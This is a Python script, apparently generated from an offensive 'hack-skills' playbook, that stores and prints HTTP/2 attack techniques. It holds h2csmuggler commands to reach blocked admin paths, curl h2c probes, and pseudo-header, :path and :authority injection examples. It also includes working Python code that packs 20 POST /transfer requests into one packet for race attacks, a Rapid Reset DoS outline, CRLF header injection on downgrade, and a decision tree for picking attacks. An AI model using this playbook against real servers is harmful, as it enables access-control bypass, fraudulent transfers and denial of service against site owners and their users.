#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/http2-specific-attacks

Skill: SKILL: HTTP/2 Specific Attacks — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-http2-specific-attacks.py --help
      python hack-skills-http2-specific-attacks.py --list
      python hack-skills-http2-specific-attacks.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/http2-specific-attacks'
TITLE = 'SKILL: HTTP/2 Specific Attacks — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: http2-specific-attacks", "description: >-", "HTTP/2 protocol-specific attack playbook. Use when the target supports HTTP/2 and you need to exploit binary framing, HPACK compression, h2c upgrade smuggling, pseudo-header injection, stream multiplexing abuse, or H2\u2192H1 downgrade translation flaws."],
    'skill-http-2-specific-attacks-expert-attack-playbook': [],
    '0-related-routing': ["- [request-smuggling](../request-smuggling/SKILL.md) \u2014 CL.TE/TE.CL/TE.TE fundamentals and H2.CL/H2.TE variants", "- [request-smuggling/H2_SMUGGLING_VARIANTS.md](../request-smuggling/H2_SMUGGLING_VARIANTS.md) \u2014 byte-level H2.CL/H2.TE payloads, CL.0, client-side desync", "- [race-condition](../race-condition/SKILL.md) \u2014 single-packet attack leverages H2 multiplexing for race conditions", "- [web-cache-deception](../web-cache-deception/SKILL.md) \u2014 cache poisoning via H2 smuggled responses"],
    '1-http-2-attack-surface-overview': [],
    '2-h2c-http-2-cleartext-smuggling': [],
    '2-1-concept': ["h2c is HTTP/2 without TLS, negotiated via the HTTP/1.1 `Upgrade` mechanism. Many reverse proxies forward the `Upgrade: h2c` header without understanding it, allowing attackers to bypass proxy-level access controls.", "Client \u2500\u2500[Upgrade: h2c]\u2500\u2500> Reverse Proxy \u2500\u2500[forwards blindly]\u2500\u2500> Backend", "Backend speaks H2", "Proxy is blind to", "the H2 conversation"],
    '2-2-attack-flow': ["1. Client sends HTTP/1.1 request with:", "GET / HTTP/1.1", "Host: target.com", "Upgrade: h2c", "HTTP2-Settings: <base64 H2 settings>", "Connection: Upgrade, HTTP2-Settings", "2. Proxy forwards request (doesn't understand h2c)", "3. Backend responds: HTTP/1.1 101 Switching Protocols", "4. Connection is now HTTP/2 between client and backend", "5. Proxy is now a TCP tunnel \u2014 cannot inspect/filter H2 frames", "6. Client sends H2 requests directly to backend, bypassing proxy rules"],
    '2-3-what-you-can-bypass': ["\u2713 Path-based access controls (/admin blocked at proxy \u2192 accessible via h2c)", "\u2713 WAF rules (proxy-side WAF can't inspect H2 binary frames)", "\u2713 Rate limiting (proxy-level rate limits bypassed)", "\u2713 Authentication (proxy-enforced auth headers)", "\u2713 IP restrictions (proxy validates source IP, but h2c tunnel bypasses)"],
    '2-4-tool-h2csmuggler': ["```bash"],
    'install': ["git clone https://github.com/BishopFox/h2csmuggler", "cd h2csmuggler", "pip3 install h2"],
    'basic-smuggle-access-admin-bypassing-proxy-restrictions': ["python3 h2csmuggler.py -x https://target.com/ --test"],
    'smuggle-specific-path': ["python3 h2csmuggler.py -x https://target.com/ -X GET -p /admin/users"],
    'with-custom-headers': ["python3 h2csmuggler.py -x https://target.com/ -X GET -p /admin \\", "-H \"Authorization: Bearer token123\""],
    '2-5-detection': ["```bash"],
    'check-if-backend-supports-h2c-upgrade': ["curl -v --http1.1 https://target.com/ \\", "-H \"Upgrade: h2c\" \\", "-H \"HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA\" \\", "-H \"Connection: Upgrade, HTTP2-Settings\""],
    '101-switching-protocols-h2c-supported': [],
    '200-400-other-h2c-not-supported-or-proxy-blocks-upgrade': [],
    '3-pseudo-header-injection': [],
    '3-1-http-2-pseudo-headers': ["HTTP/2 replaces the request line with pseudo-headers (prefixed with `:`):"],
    '3-2-path-discrepancy-between-proxy-and-backend': ["Scenario: Proxy routes based on :path, backend uses different parsing", "H2 request:", ":method: GET", ":path: /public/../admin/users", ":authority: target.com", "Proxy sees: /public/../admin/users \u2192 matches /public/* rule \u2192 ALLOWED", "Backend normalizes: /admin/users \u2192 serves admin content"],
    '3-3-duplicate-pseudo-header-injection': ["HTTP/2 spec forbids duplicate pseudo-headers, but implementation varies:", ":method: GET", ":path: /public", ":path: /admin       \u2190 duplicate, forbidden by spec", ":authority: target.com", "Proxy may use first :path (/public) for routing", "Backend may use last :path (/admin) for serving"],
    '3-4-authority-vs-host-disagreement': [":authority: public.target.com    \u2190 proxy routes based on this", "host: admin.internal.target.com  \u2190 backend may prefer Host header", "Result: proxy routes to public vhost, backend serves admin vhost"],
    '3-5-scheme-manipulation': [":scheme: https", ":path: /api/internal", ":authority: target.com", "If backend trusts :scheme to determine if request is \"internal\":", ":scheme: https \u2192 \"external\" \u2192 restricted", ":scheme: http  \u2192 \"internal\" \u2192 unrestricted access"],
    '4-hpack-compression-attacks': [],
    '4-1-crime-breach-on-http-2': ["Principle: HPACK compresses headers. If attacker controls part of a header and a secret", "exists in the same compression context, matching guesses \u2192 smaller frames \u2192 oracle.", "Limitation: HPACK uses static+dynamic table (not raw DEFLATE), per-connection table,", "requires many requests on same connection. Harder than original CRIME."],
    '4-2-header-table-poisoning': ["HPACK dynamic table stores recent headers across requests on same connection.", "1. Attacker sends X-Custom: malicious-value \u2192 added to dynamic table", "2. Subsequent requests may reference this entry", "3. If CDN/proxy pools connections \u2192 attacker and victim share table \u2192 cross-request leakage"],
    '5-stream-multiplexing-abuse': [],
    '5-1-single-packet-attack-race-conditions': ["HTTP/2 multiplexing allows sending multiple requests in a single TCP packet, achieving true simultaneous server-side processing:", "Traditional race condition: send N requests \u2192 network jitter \u2192 inconsistent timing", "H2 single-packet: pack N requests into one TCP segment \u2192 all arrive simultaneously", "\u250c\u2500 Stream 1: POST /transfer (amount=1000)", "Single TCP packet \u2500\u2500\u251c\u2500 Stream 3: POST /transfer (amount=1000)", "\u251c\u2500 Stream 5: POST /transfer (amount=1000)", "\u2514\u2500 Stream 7: POST /transfer (amount=1000)", "All 4 requests processed at the same nanosecond window", "```python"],
    'using-h2-library-prepare-all-requests-send-in-single-write': ["import h2.connection, h2.config, socket, ssl", "ctx = ssl.create_default_context()", "ctx.set_alpn_protocols(['h2'])", "sock = ctx.wrap_socket(socket.create_connection((host, 443)), server_hostname=host)", "conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))", "conn.initiate_connection()", "sock.sendall(conn.data_to_send())", "for i in range(20):", "sid = conn.get_next_available_stream_id()", "conn.send_headers(sid, [(':method','POST'),(':path',path),(':authority',host),(':scheme','https')])", "conn.send_data(sid, b'amount=1000', end_stream=True)", "sock.sendall(conn.data_to_send())  # ALL frames in single TCP packet"],
    '5-2-rst-stream-flood-cve-2023-44487-rapid-reset': ["Attack: HEADERS (open stream) \u2192 RST_STREAM (cancel) \u2192 repeat thousands/sec", "Server processes each open/close but client doesn't wait for responses", "Amplification: minimal client resources \u2192 massive server CPU exhaustion"],
    '5-3-priority-manipulation': ["Set exclusive=true + weight=256 on attacker's stream \u2192 starve other users' requests"],
    '6-http-2-http-1-1-downgrade-issues': [],
    '6-1-header-injection-via-binary-format': ["H2 header values are binary \u2014 `\\r\\n` is valid data within a value. When proxy downgrades to H1, `\\r\\n` in header value becomes actual line break \u2192 header injection.", "H2: X-Custom: \"value\\r\\nInjected: evil\"  \u2192 binary, valid", "H1: X-Custom: value                      \u2192 line break", "Injected: evil                        \u2192 new header!"],
    '6-2-transfer-encoding-smuggling': ["H2 spec forbids `transfer-encoding`, but some proxies pass it through during downgrade \u2192 backend processes chunked encoding \u2192 H2.TE smuggling. See `../request-smuggling/H2_SMUGGLING_VARIANTS.md`."],
    '6-3-content-length-discrepancy': ["H2 uses frame length (no CL needed). If proxy generates CL during downgrade but attacker also sent a CL header \u2192 conflicting lengths \u2192 request smuggling."],
    '6-4-header-name-case': ["H2 requires lowercase. Sending `Transfer-Encoding` (uppercase) is invalid H2 but some proxies pass it \u2192 valid H1 header on backend."],
    '7-server-push-cache-poisoning': ["Attack: trigger server push for /static/app.js with attacker-controlled content", "\u2192 PUSH_PROMISE frame pushes malicious response", "\u2192 browser/CDN caches poisoned content under legitimate URL", "\u2192 all subsequent loads serve attacker's content", "Mitigation: most modern browsers/CDNs restrict or disable server push"],
    '8-decision-tree': ["Target supports HTTP/2?", "\u251c\u2500\u2500 YES", "\u2502   \u251c\u2500\u2500 Does proxy support h2c upgrade?", "\u2502   \u2502   \u251c\u2500\u2500 YES \u2192 h2c smuggling (Section 2)", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 Access restricted paths bypassing proxy rules", "\u2502   \u2502   \u2514\u2500\u2500 NO \u2192 Continue", "\u2502   \u2502", "\u2502   \u251c\u2500\u2500 H2\u2192H1 downgrade between proxy and backend?", "\u2502   \u2502   \u251c\u2500\u2500 YES \u2192 Header injection via binary format (Section 6.1)", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 TE header passthrough? \u2192 H2.TE smuggling (Section 6.2)", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 CL discrepancy? \u2192 H2.CL smuggling (Section 6.3)", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 See ../request-smuggling/H2_SMUGGLING_VARIANTS.md", "\u2502   \u2502   \u2514\u2500\u2500 NO (end-to-end H2) \u2192 Continue", "\u2502   \u2502", "\u2502   \u251c\u2500\u2500 Need race condition?", "\u2502   \u2502   \u251c\u2500\u2500 YES \u2192 Single-packet attack via multiplexing (Section 5.1)", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 Pack N requests in one TCP segment", "\u2502   \u2502   \u2514\u2500\u2500 NO \u2192 Continue", "\u2502   \u2502", "\u2502   \u251c\u2500\u2500 Pseudo-header manipulation viable?", "\u2502   \u2502   \u251c\u2500\u2500 :path discrepancy \u2192 path confusion (Section 3.2)", "\u2502   \u2502   \u251c\u2500\u2500 :authority vs Host \u2192 vhost confusion (Section 3.4)", "\u2502   \u2502   \u2514\u2500\u2500 :scheme manipulation \u2192 access control bypass (Section 3.5)", "\u2502   \u2502", "\u2502   \u251c\u2500\u2500 Server push enabled?", "\u2502   \u2502   \u251c\u2500\u2500 YES \u2192 Cache poisoning via push (Section 7)", "\u2502   \u2502   \u2514\u2500\u2500 NO \u2192 Continue", "\u2502   \u2502", "\u2502   \u2514\u2500\u2500 DoS objective?", "\u2502       \u251c\u2500\u2500 RST_STREAM rapid reset (Section 5.2)", "\u2502       \u2514\u2500\u2500 PRIORITY starvation (Section 5.3)", "\u2514\u2500\u2500 NO (HTTP/1.1 only)", "\u2514\u2500\u2500 See ../request-smuggling/SKILL.md for H1-specific techniques"],
    '9-tools-reference': [],
    '10-quick-reference': ["```bash"],
    'h2c-probe': ["curl -v --http1.1 https://target.com/ -H \"Upgrade: h2c\" -H \"Connection: Upgrade, HTTP2-Settings\" -H \"HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA\""],
    'h2-support-check': ["curl -v --http2 https://target.com/ 2>&1 | grep \"ALPN\""],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()